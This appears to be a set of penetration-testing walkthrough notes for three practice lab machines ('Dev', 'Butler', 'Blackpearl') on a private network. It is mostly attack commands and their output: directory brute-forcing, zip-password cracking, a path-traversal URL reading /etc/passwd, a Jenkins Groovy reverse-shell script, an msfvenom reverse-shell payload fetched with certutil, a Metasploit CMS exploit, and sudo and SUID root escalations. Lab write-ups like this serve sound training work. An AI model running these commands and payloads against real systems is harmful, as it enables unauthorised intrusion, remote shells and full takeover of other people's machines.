[23:05:38] 403 -  280B  - /.htaccess_extra
[23:05:38] 403 -  280B  - /.htaccessOLD                                     
[23:05:38] 403 -  280B  - /.htaccessOLD2
[23:05:38] 403 -  280B  - /.htpasswd_test                                   
[23:05:38] 403 -  280B  - /.html
[23:05:38] 403 -  280B  - /.httr-oauth                                      
[23:05:38] 403 -  280B  - /.htpasswds                                       
[23:05:42] 403 -  280B  - /.php                                             
[23:06:20] 301 -  316B  - /app  ->  http://192.168.179.132/app/             
[23:06:20] 200 -    1KB - /app/                                             
[23:06:20] 200 -    2KB - /app/cache/                                       
[23:06:33] 200 -  971B  - /composer.json                                    
[23:06:34] 200 -  206KB - /composer.lock                                    
[23:07:27] 301 -  319B  - /public  ->  http://192.168.179.132/public/       
[23:07:27] 302 -  332B  - /public/  ->  /public/bolt/userfirst              
[23:07:28] 200 -  345B  - /README.md                                        
[23:07:33] 403 -  280B  - /server-status/                                   
[23:07:33] 403 -  280B  - /server-status
[23:07:39] 200 -  928B  - /src/                                             
[23:07:39] 301 -  316B  - /src  ->  http://192.168.179.132/src/             
[23:07:51] 200 -    0B  - /vendor/composer/autoload_classmap.php            
[23:07:51] 200 -    0B  - /vendor/autoload.php
[23:07:51] 200 -    0B  - /vendor/composer/autoload_psr4.php
[23:07:51] 200 -    0B  - /vendor/composer/autoload_real.php
[23:07:51] 200 -    0B  - /vendor/composer/autoload_static.php              
[23:07:51] 200 -    0B  - /vendor/composer/autoload_files.php               
[23:07:51] 200 -    0B  - /vendor/composer/ClassLoader.php                  
[23:07:51] 200 -    0B  - /vendor/composer/autoload_namespaces.php          
[23:07:51] 200 -    7KB - /vendor/
[23:07:51] 200 -    1KB - /vendor/composer/LICENSE                          
[23:07:52] 200 -  191KB - /vendor/composer/installed.json                   
                                                                             
Task Completed                                                                                                                                        
              

┌──(kali㉿kali)-[~]
└─$ python3 dirsearch/dirsearch.py -u http://192.168.179.132:8080/

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                      
 (_||| _) (/_(_|| (_| )                                                                                                                               
                                                                                                                                                      
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11713

Output: /home/kali/reports/http_192.168.179.132_8080/__23-09-23_23-23-27.txt

Target: http://192.168.179.132:8080/

[23:23:27] Starting:                                                                                                                                  
[23:23:35] 403 -  282B  - /.ht_wsr.txt                                      
[23:23:35] 403 -  282B  - /.htaccess.bak1                                   
[23:23:35] 403 -  282B  - /.htaccess.sample                                 
[23:23:35] 403 -  282B  - /.htaccess.save                                   
[23:23:35] 403 -  282B  - /.htaccess_extra                                  
[23:23:35] 403 -  282B  - /.htaccess_sc
[23:23:35] 403 -  282B  - /.htaccessOLD
[23:23:35] 403 -  282B  - /.htaccessOLD2
[23:23:35] 403 -  282B  - /.htaccess.orig
[23:23:35] 403 -  282B  - /.htm                                             
[23:23:35] 403 -  282B  - /.html
[23:23:35] 403 -  282B  - /.htaccessBAK                                     
[23:23:35] 403 -  282B  - /.htpasswd_test                                   
[23:23:35] 403 -  282B  - /.htaccess_orig
[23:23:35] 403 -  282B  - /.httr-oauth
[23:23:35] 403 -  282B  - /.htpasswds                                       
[23:23:39] 403 -  282B  - /.php                                             
[23:24:38] 301 -  323B  - /dev  ->  http://192.168.179.132:8080/dev/        
[23:24:39] 200 -    7KB - /dev/                                             
[23:25:34] 403 -  282B  - /server-status                                    
[23:25:34] 403 -  282B  - /server-status/                                   
                                                                             
Task Completed 

```

3. Obtained a user credential from :80/app/config/config.yml
```
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
```

4. Mounted file founded. 
```
┌──(kali㉿kali)-[~]
└─$ showmount -e 192.168.179.132
Export list for 192.168.179.132:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

┌──(kali㉿kali)-[~]
└─$ sudo mkdir /mnt/dev                                   
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 192.168.179.132:/srv/nfs /mnt/dev
                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ cd /mnt/dev   

┌──(kali㉿kali)-[/mnt/dev]
└─$ unzip save.zip        
Archive:  save.zip
[save.zip] id_rsa password: 
   skipping: id_rsa                  incorrect password
   skipping: todo.txt                incorrect password

```

4. Cracked it with fcrackzip 
```
┌──(kali㉿kali)-[/mnt/dev]
└─$ sudo fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip 
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)


PASSWORD FOUND!!!!: pw == java101

┌──(kali㉿kali)-[/mnt/dev]
└─$ ls
id_rsa  save.zip  todo.txt
                                                                                                                                                      
┌──(kali㉿kali)-[/mnt/dev]
└─$ cat todo.txt             
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
```

5. Used boltwire local file inclusion vulnerabilities. Did transversal attack after registering new account on 8080/dev/

```
┌──(kali㉿kali)-[~]
└─$ searchsploit boltwire             
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                         | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                                                | php/webapps/48411.txt
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


http://192.168.179.132:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```

6. Obtained JP user name and use password obtained from config file. Establish ssh connection. 
```
┌──(kali㉿kali)-[/mnt/dev]
└─$ ssh -i id_rsa jeanpaul@192.168.179.132                       
The authenticity of host '192.168.179.132 (192.168.179.132)' can't be established.
ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.179.132' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
jeanpaul@dev:~$ ls
```

7. Use sudo zip permission to be rooted. 
```
jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)

```

### Butler
1. Start with Nmap - port 8080 have a login page. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 192.168.179.133                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 00:06 EDT
Nmap scan report for 192.168.179.133
Host is up (0.00034s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8080/tcp open  http          Jetty 9.4.41.v20210516
|_http-server-header: Jetty(9.4.41.v20210516)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 00:0C:29:E0:A9:ED (VMware)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 14h59m59s
| smb2-time: 
|   date: 2023-09-24T19:06:55
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 000c29e0a9ed (VMware)

TRACEROUTE
HOP RTT     ADDRESS
1   0.34 ms 192.168.179.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds

```

2. Use burp suite for brute forcing login page. #burpbrute
a. Intercept proxy traffic and forward it to intruder. 
b. In position, clear all $ and, add $ in the fort and back of user and password. Use Cluster bomb attack type. 
c. Move to payload, and add user list and password list, start attack. 
d. User: jenkins and password:jenkins

3. Login > Manage Jenkins > open console and run these groovy script for reverse shell. 
```
String host="192.168.179.128";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

4. Obtained netcat listener. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nvlp 8044              
[sudo] password for kali: 
listening on [any] 8044 ...
connect to [192.168.179.128] from (UNKNOWN) [192.168.179.133] 53338
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Jenkins>

```

5. Load and run linpeas. 
```
c:\Users\butler>certutil.exe -urlcache -f https://github.com/carlospolop/PEASS-ng/releases/tag/20230924-10138da9/winPEASx64.exe winpeas.exe

```

6. Generate reverse shell payload and upload it to victim machine. 
```
──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.179.128 LPORT=7777 -f exe > wise.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes

c:\Program Files (x86)\Wise>certutil -urlcache -f http://192.168.179.128/wise.exe wise.exe
certutil -urlcache -f http://192.168.179.128/wise.exe wise.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

7. Rerun wisebootassistant after netcat listener. 
```
c:\Program Files (x86)\Wise>sc stop WiseBootAssistant
sc stop WiseBootAssistant

SERVICE_NAME: WiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\Program Files (x86)\Wise>sc query WiseBootAssistant
sc query WiseBootAssistant

SERVICE_NAME: WiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\Program Files (x86)\Wise>sc start WiseBootAssistant


┌──(kali㉿kali)-[~]
└─$ sudo nc -nvlp 7777                  
[sudo] password for kali: 
listening on [any] 7777 ...
connect to [192.168.179.128] from (UNKNOWN) [192.168.179.133] 53366
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>id
```

8. Rooted. 


### Blackpearl

1. Start with nmap
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 192.168.179.134    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 01:14 EDT
Nmap scan report for 192.168.179.134
Host is up (0.00064s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66381450ae7dab3972bf419c39251a0f (RSA)
|   256 a62e7771c6496fd573e9227d8b1ca9c6 (ECDSA)
|_  256 890b73c153c8e1885ec316ded1e5260d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
MAC Address: 00:0C:29:DE:5D:08 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 192.168.179.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.05 seconds

```

2. Dns recon and rename ip address. (Secret subdirectory reveal that name need to be change)
```
┌──(kali㉿kali)-[~]
└─$ dnsrecon -r 127.0.0.0/24 -n 192.168.179.134 -d blah
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.121.47    cmess.thm
192.168.179.134 blackpearl.thm

```

3. Subdirectories search again. 
```
──(kali㉿kali)-[~]
└─$ gobuster dir -u http://blackpearl.tcm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blackpearl.tcm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/24 01:23:53 Starting gobuster in directory enumeration mode
===============================================================
/navigate             (Status: 301) [Size: 185] [--> http://blackpearl.tcm/navigate/]
Progress: 18876 / 87665 (21.53%)^Z
zsh: suspended  gobuster dir -u http://blackpearl.tcm/ -w
```


4. Search for relevant cms exploit from metasploit and run exploit. 
```
msf6 > use exploit/multi/http/navigate_cms_rce 
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/navigate_cms_rce) > options

Module options (exploit/multi/http/navigate_cms_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.179.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/navigate_cms_rce) > set RHOSTS 192.168.179.134
RHOSTS => 192.168.179.134
msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
vhost => blackpearl.tcm
msf6 exploit(multi/http/navigate_cms_rce) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic


msf6 exploit(multi/http/navigate_cms_rce) > rn
[-] Unknown command: rn
msf6 exploit(multi/http/navigate_cms_rce) > run

[*] Started reverse TCP handler on 192.168.179.128:4444 
[+] Login bypass successful
[+] Upload successful
[*] Triggering payload...
[*] Sending stage (39927 bytes) to 192.168.179.134
[*] Meterpreter session 1 opened (192.168.179.128:4444 -> 192.168.179.134:41392) at 2023-09-24 01:23:31 -0400

meterpreter > shell
```

5. Make it interactive. 
```
python -c 'import pty;pty.spawn("/bin/bash");'
www-data@blackpearl:~/blackpearl.tcm/navigate$ ls

```

6. Load linpeas and then find suid files. 
```
www-data@blackpearl:/tmp$ find / -type f -perm -04000 -ls 2>/dev/null                           
find / -type f -perm -04000 -ls 2>/dev/null
    12774     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   135600     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
    16121    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
     3910     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
     3436     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
     3908     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
    18907   4668 -rwsr-xr-x   1 root     root        4777720 Feb 13  2021 /usr/bin/php7.3
     3583     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
       52     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
       56     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
       53     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
       55     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd

```

7. Use php for suid priesc from gtfobins. Rooted. 
```
www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
cd /root
# ls
ls
flag.txt

```